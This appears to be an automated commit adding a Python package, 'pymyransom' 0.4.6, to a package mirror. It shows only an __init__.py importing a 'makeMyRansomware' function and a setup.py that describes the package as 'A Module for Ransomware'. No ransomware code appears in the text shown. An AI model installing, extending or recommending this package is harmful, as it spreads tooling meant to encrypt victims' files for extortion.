5f6eb22d0dbcf6596a07e1e5b15a9510f1bcdc77
Bot <41898282+github-actions[bot]@users.noreply.github.com>
2023-08-05 18:12:47 +0000

    Add package pymyransom/0.4.6/pymyransom-0.4.6.tar.gz

---
+++ packages/pymyransom/pymyransom-0.4.6.tar.gz/pymyransom-0.4.6/pymyransom/__init__.py
@@ -0,0 +1,1 @@
+from pymyransom.pymyransom import makeMyRansomware
---
+++ packages/pymyransom/pymyransom-0.4.6.tar.gz/pymyransom-0.4.6/setup.py
@@ -0,0 +1,27 @@
+from setuptools import setup, find_packages
+
+with open("README.md", "r") as fh:
+    long_description = fh.read()
+
+setup(
+    name = "pymyransom",
+    version = "0.4.6",
+    description = "A Module for Ransomware",
+    url = "https://github.com/Huntingbear21/pymyransom",
+    long_description=long_description,
+    long_description_content_type="text/markdown",
+    author = "Huntingbear21",
+    author_email = "huntingbear21@naver.com",
+    install_requires = ['pycryptodomex'],
+    packages = ['pymyransom', 'test'],
+    keywords = ["pymyransom"],
+    python_requires = ">=3.5",
+    package_data = {},
+    zip_safe = False,
+    classifiers = [
+        'Programming Language :: Python :: 3.5',
+        'Programming Language :: Python :: 3.6',
+        'Programming Language :: Python :: 3.7',
+        'Programming Language :: Python :: 3.8'
+    ],
+)
